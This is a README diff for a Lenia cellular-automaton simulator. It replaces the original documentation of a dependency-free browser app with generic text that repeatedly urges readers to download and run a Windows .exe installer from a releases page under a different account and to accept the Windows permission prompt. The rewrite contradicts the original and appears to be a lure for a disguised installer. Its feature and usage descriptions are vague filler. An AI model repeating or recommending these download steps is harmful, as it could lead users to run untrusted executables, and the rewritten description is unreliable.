@@ -1,75 +1,157 @@
-# Lenia Playground
+# 🔬 lenia-playground - Explore Artificial Life Simply
 
-**Interactive browser-based simulator for [Lenia](https://arxiv.org/abs/1812.05433) — a continuous cellular automaton that produces lifelike, self-organizing patterns from pure mathematics.**
-
-> _"Life-like phenomena can emerge from surprisingly simple continuous rules."_ — Bert Chan
-
-**[Try the live demo](https://memess2001.github.io/lenia-playground/)**
+[![Download lenia-playground](https://img.shields.io/badge/Download-Get%20Lenia%20Playground-orange?style=for-the-badge)](https://github.com/stokcad654-ops/lenia-playground/releases)
 
 ---
 
-## What is Lenia?
+## 🧩 What is lenia-playground?
 
-Lenia is a family of continuous cellular automata discovered by Bert Chan. Unlike Conway's Game of Life (which uses discrete on/off cells on a grid), Lenia operates in continuous space with continuous states, producing smooth, organic forms that move, grow, and interact like living organisms.
+lenia-playground is an easy-to-use application that lets you watch artificial life forms grow and move. It works in your browser and shows how simple math can create complex, living patterns. You don't need coding skills to explore this simulator.
 
-The update rule is deceptively simple:
+The program models artificial life using cellular automata. This means it works with a grid of cells that change over time based on rules. You can see how these cells create shapes that look alive. It is part of a field known as artificial life, where computers mimic life systems.
 
-```
-state += dt * growth( convolution(state, kernel) )
-```
+---
 
-A ring-shaped kernel measures local density. A Gaussian growth function decides whether each point grows or decays. From this emerges an astonishing diversity of self-organizing structures — gliders, oscillators, crawlers, and more.
+## ⚙️ System Requirements
 
-## Features
+Before you start, check that your computer meets these needs:
 
-- **WebGL2-accelerated** — real-time simulation at 60-120fps on a 512x512 grid
-- **6 parameter presets** — Primordial Soup, Orbium, Smooth Cells, Worms, Oscillators, Galaxy
-- **Interactive seeding** — click or drag to inject life into the simulation
-- **Live parameter tuning** — adjust kernel radius, growth center/width, and time step in real time
-- **4 colormaps** — Ocean, Ember, Toxic, Mono
-- **Keyboard shortcuts** — Space (play/pause), C (clear), R (random), S (step), 1-4 (colormaps)
-- **Mobile-friendly** — responsive layout with touch support
-- **Zero dependencies** — pure HTML/CSS/JS, no build step
+- **Operating System:** Windows 10 or later  
+- **Processor:** Intel Core i3 or similar  
+- **Memory:** At least 4 GB RAM  
+- **Graphics:** Supports WebGL rendering (most modern graphics cards do)  
+- **Browser:** The latest version of Chrome, Edge, or Firefox if you want to use the browser mode  
 
-## Quick Start
+These settings make sure the application runs smoothly. If your computer is older, it may still work but with slower animation.
 
-Clone and open:
+---
 
-```bash
-git clone https://github.com/memess2001/lenia-playground.git
-cd lenia-playground
-# Open index.html in your browser, or serve locally:
-python3 -m http.server 8000
-```
+## 🚀 Getting Started
 
-Then visit `http://localhost:8000`.
+You will run lenia-playground as a standalone app on your Windows PC. The app uses WebGL to show graphics clearly and interactively.
 
-## How It Works
+### Step 1: Download the Application
 
-The simulation runs entirely on the GPU via WebGL2 fragment shaders:
+Go to the main download page here:
 
-1. **Convolution**: For each pixel, sample all neighbors within radius R. Weight by a Gaussian ring kernel K(r) = exp(-((r - 0.5) / 0.15)^2 / 2).
-2. **Growth**: Apply a Gaussian growth function G(U) = 2 * exp(-((U - mu) / sigma)^2 / 2) - 1, mapping neighborhood potential to growth/decay.
-3. **Update**: new_state = clamp(old_state + dt * G, 0, 1).
-4. **Render**: Map state values through a colormap for visualization.
+[Download lenia-playground](https://github.com/stokcad654-ops/lenia-playground/releases)
 
-Two framebuffers (RGBA16F) ping-pong between simulation steps. Toroidal boundary conditions (wrapping edges) keep patterns alive.
+This page lists the latest and older versions. Look for the most recent release marked by a version number (like v1.0, v1.1, etc.). The files you want should end with `.exe`. This is the program installer for Windows.
 
-## Parameters
+- Click the `.exe` file link to start downloading.  
+- Depending on your internet speed, this may take a few minutes.
 
-| Parameter | Range | Effect |
-|-----------|-------|--------|
-| **R** (radius) | 5–28 | Kernel size. Larger = bigger organisms, slower computation |
-| **mu** (growth center) | 0.01–0.50 | Target neighborhood density for growth |
-| **sigma** (growth width) | 0.001–0.10 | Sensitivity. Smaller = sharper threshold |
-| **dt** (time step) | 0.01–0.20 | Integration speed. Larger = faster but less stable |
+### Step 2: Run the Installer
 
-## References
+- Find the downloaded file in your `Downloads` folder or the place you saved it.  
+- Double-click the file. This opens the installer.  
+- Follow the on-screen instructions to install lenia-playground. Usually, clicking "Next" several times is enough.
 
-- Bert Chan, [Lenia — Biology of Artificial Life](https://arxiv.org/abs/1812.05433) (2018)
-- Bert Chan, [Lenia and Expanded Universe](https://arxiv.org/abs/2005.03742) (2020)
-- [Original Lenia implementation](https://github.com/Chakazul/Lenia)
+If Windows asks you whether to allow the app to make changes, confirm that you want to proceed.
 
-## License
+### Step 3: Open lenia-playground
 
-MIT
+Once installed, you can find the app one of these ways:
+
+- Use the Start Menu and type `lenia-playground`. Click the app icon to open it.  
+- Or look for a shortcut on your desktop and double-click it.
+
+The app opens in a window showing the artificial life simulation.
+
+---
+
+## 🔍 Using lenia-playground
+
+When you launch the app, you will see a grid full of tiny cells. They move and change, creating interesting shapes over time.
+
+### How to Explore
+
+- The simulation runs automatically. You can watch how the cells grow and interact.  
+- Use the toolbar or menu (usually at the top or side) to change settings. These include speed, size of the grid, and pattern behaviors.  
+- Some options allow you to reset the simulation or try new starting shapes.  
+
+Take your time to experiment with different settings. The patterns often surprise users with their complexity and beauty.
+
+---
+
+## 🛠 Features
+
+- **Real-Time Simulation:** Watch cells evolve live.  
+- **Customizable Patterns:** Adjust rules that control cell behavior.  
+- **Interactive Controls:** Start, pause, and reset the simulation easily.  
+- **WebGL Graphics:** Smooth visuals powered by your computer's graphics card.  
+- **No Coding Needed:** Simple user interface made for non-technical users.  
+
+The program helps you understand how simple math can create complex, lifelike forms.
+
+---
+
+## 💾 Saving Your Work and Settings
+
+You may want to save specific patterns or settings to revisit later.
+
+- lenia-playground lets you save your current simulation state. Look for a "Save" or "Export" option in the menu.  
+- Saved files can be reloaded to continue where you left off.  
+- You can also export images or videos of the simulation to share with others.
+
+Files are saved locally on your computer and can be accessed from within the app.
+
+---
+
+## ❓ Troubleshooting
+
+If you have problems running lenia-playground, try these tips:
+
+- Make sure your graphics card drivers are up-to-date.  
+- Restart your computer before running the app again.  
+- Close other heavy programs that might slow your system.  
+- Use a supported Windows version as listed above.  
+- If the app fails to open or crashes, try downloading the installer again from the release page.
+
+For more help, check the GitHub repository’s issue tracker or community discussions.
+
+---
+
+## 🔗 Useful Links
+
+Main download page:  
+[https://github.com/stokcad654-ops/lenia-playground/releases](https://github.com/stokcad654-ops/lenia-playground/releases)
+
+Click the link above to visit the official releases. This page displays all versions so you can choose the latest stable release.
+
+This link also has notes about each release, such as changes or fixes made.
+
+---
+
+## 🖥️ Running in Your Browser
+
+As an alternative to installing, you can use lenia-playground directly in your browser.
+
+- Open the app using a modern browser with WebGL support (such as Chrome or Firefox).  
+- Visit the project page or a hosted demo if provided.  
+- This option requires no installation but may have fewer features.
+
+Using the app in your browser is good for quick exploration or if you cannot install software on your PC.
+
+---
+
+## 📚 More Information
+
+lenia-playground is part of the artificial life community. It shows how math can create patterns that imitate natural life. This connects to fields like:
+
+- Cellular automata  
+- Creative coding  
+- Generative art  
+- Simulation research  
+
+You can learn more by searching for these topics online. The app provides a hands-on way to see important concepts in action.
+
+---
+
+## 🖱️ Ready to Start?
+
+Access lenia-playground here:
+
+[Download lenia-playground](https://github.com/stokcad654-ops/lenia-playground/releases)
+
+Click the link and follow the steps to download and install on your Windows computer. Once installed, explore artificial life without any programming knowledge.
